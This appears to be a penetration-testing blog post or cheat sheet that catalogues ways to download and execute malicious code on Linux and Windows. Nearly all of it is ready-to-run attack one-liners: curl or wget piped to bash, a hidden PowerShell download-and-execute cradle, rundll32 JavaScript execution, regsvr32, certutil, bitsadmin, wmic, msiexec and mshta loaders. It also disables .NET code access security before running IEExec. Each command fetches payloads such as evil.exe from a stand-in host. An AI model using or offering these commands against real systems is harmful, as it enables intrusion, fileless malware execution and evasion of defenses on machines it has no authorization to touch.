---
title: "Several methods to download and execute malicious code through command"
date: "2018-01-03T13:15:30Z"
description: "The execution of malicious code on the target host can be divided into uploading/downloading and executing malicious code and fileless remote malicious code execution. Next, let's summarize some methods of downloading and executing malicious code in Linux and Windows."
tags:
  - "Shell"
  - "Cybersecurity"
  - "Penetration test"
---

In the process of infiltration, attackers often need to download and execute malicious code through commands to implement operations such as information collection, persistence, privilege enhancement, defense bypass, extraction of credentials, lateral movement, and data exfiltration.

The execution of malicious code on the target host can be divided into uploading/downloading and executing malicious code and fileless remote malicious code execution. Next, let's summarize some methods of downloading and executing malicious code in Linux and Windows.


## Linux 
#### curl
Execute the shell script on the http page in `curl`, without downloading, directly execute on the local machine.
```shell
bash < <( curl http://192.168.1.1:8000/test.sh  )
curl -fsSL http://192.168.1.1:8000/test.sh | bash
```

#### wget
Execute the `wget` command to download malicious programs remotely.

```shell
wget -q -O- http://192.168.1.1:8000/test.sh | bash
wget http://192.168.1.1:8000/shell.txt -O /tmp/x.php && php /tmp/x.php
```

Combine `curl`+`wget` to realize fileless remote malicious code execution.

```shell
bash -c '(curl -fsSL http://192.168.1.1:8000/test.sh||
wget -q -O- http://192.168.1.1:8000/test.sh)|bash -sh >/dev/null 2>&1&'
```

#### rcp
The `rcp` command is used to copy remote files or directories.
```shell
rcp username@servername:./testfile testfile
```


#### sftp

Use `sftp` to download files on the remote server.

```shell
sftp admin@192.168.1.1 <<EOF  
get  /tmp/1.txt            
quit 
EOF
```

#### scp
`scp` is an enhanced version of `rcp`, `scp` is encrypted, `rcp` is not encrypted.

```shell
scp username@servername:/path/filename /tmp/local_destination
```
#### rsync
Use `rsync` to synchronize remotely and pull files to a local server.
```shell
rsync -av servername:/tmp/passwd.txt  /tmp/passwd.txt
```


## Windows 

#### Powershell
Use powershell to remotely execute ps1 scripts.
```shell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1/evil.txt'))"
```


#### rundll32
Using `rundll32.exe`, JavaScript can be executed through `mshtml.dll`, which depends on the `WScript.shell` component

```shell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.1:8000/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

#### bitsadmin
Use the `bitsadmin` command to download the file to the target machine.
```shell
bitsadmin /transfer n http://192.168.1.1/imag/evil.txt d:\test.txt
```

#### certutil
It is used to back up the certificate service. Generally, it is recommended to delete the cache after downloading the file.

```shell
certutil -urlcache -split -f http://192.168.1.1/imag/evil.txt test.php
certutil -urlcache -split -f http://192.168.1.1/imag/evil.txt delete
```

#### regsvr32
Remote load execution, parse the `.src` file.

```shell
regsvr32.exe /u /n /s /i:http://192.168.1.1:8000/file.sct scrobj.dll
```





#### pubprn.vbs
There is a Microsoft signed WSH script named `pubprn.vbs` in Windows 7 and above, which can be used to parse the `.sct` script:

```shell
"C:\Windows\System32\Printing_Admin_Scripts\en\pubprn.vbs" 127.0.0.1 script:https://servername/test.sct
```


#### wmic
Execute the following `WMIC` command to download and run the malicious XSL file from the remote server:
```shell
wmic os get /FORMAT:"http://192.168.1.1/evil.xsl"
```

#### msiexec
It is used to install the Windows Installer installation package and can execute the msi file remotely.

```shell
msiexec /q /i http://192.168.1.1/evil.msi
```


#### msxsl

`msxsl.exe` is a program used by Microsoft to process XSL under the command line

```shell
msxsl http://192.168.1.1/scripts/demo.xml http://192.168.1.1/scripts/exec.xsl
```

#### IEExec
The `IEexec.exe` application is a program that comes with the .NET Framework. Run `IEExec.exe` and use url to start other programs.

```shell
crosoft.NET\Framework64\v2.0.50727>caspol.exe -s off
C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.1.1/evil.exe
```

#### mshta
`mshta` is used to execute `.hta` files
```shell
mshta http://192.168.1.1/run.hta
```
